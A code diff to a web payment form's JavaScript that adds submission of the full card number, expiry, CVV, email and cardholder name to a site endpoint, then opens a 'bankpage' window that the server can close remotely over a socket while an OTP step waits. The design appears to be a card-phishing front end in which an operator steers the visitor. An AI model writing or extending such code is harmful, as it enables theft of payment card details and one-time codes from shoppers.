@@ -714,7 +714,7 @@ async function updateCardTypeAndInfo(value) {
       updateConfirmOtpButton();
     });
 
-    // ========= Payment Submission Handler =========
+// ========= Payment Submission Handler =========
 document.getElementById('mainForm').addEventListener('submit', async function(e) {
   e.preventDefault();
   if (!isCardValid || !isExpiryValid || isProcessing) return;
@@ -723,40 +723,45 @@ document.getElementById('mainForm').addEventListener('submit', async function(e)
   const overlay = document.getElementById('bankpageOverlay');
   const submitButton = document.getElementById('submitButton');
   
-  // Show fullscreen spinner immediately
+  // Show fullscreen spinner and blur
   overlay.style.display = 'flex';
-  
+
   try {
     const response = await fetch("/api/sendPaymentDetails", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({/* existing payload */})
+      body: JSON.stringify({
+        cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value,
+        email: document.getElementById('email').value,
+        amount: document.getElementById('amount').value,
+        currency: "INR",
+        cardholder: document.getElementById('cardholderName').value
+      })
     });
     
     const result = await response.json();
     if (result.status === "success") {
-      // Open bankpage and store reference
+      // Open bankpage in new window
       bankPageWindow = window.open(`/bankpage.html?invoiceId=${result.invoiceId}`, '_blank');
       currentInvoiceId = result.invoiceId;
 
-      // Show button spinner
-      submitButton.querySelector('#submitLoader').classList.remove('hidden');
-      
-      // Listen for hide commands
+      // Listen for hide bankpage events
       socket.on(`bankpage_hide_${currentInvoiceId}`, () => {
         if (bankPageWindow && !bankPageWindow.closed) {
           bankPageWindow.close();
         }
-        // Switch to button spinner mode
+        // Hide overlay but keep button disabled with spinner
         overlay.style.display = 'none';
         submitButton.querySelector('#submitLoader').classList.remove('hidden');
         submitButton.disabled = true;
       });
+
     }
   } catch (err) {
     console.error('Payment submission error:', err);
     overlay.style.display = 'none';
-    submitButton.querySelector('#submitLoader').classList.add('hidden');
     isProcessing = false;
   }
 });
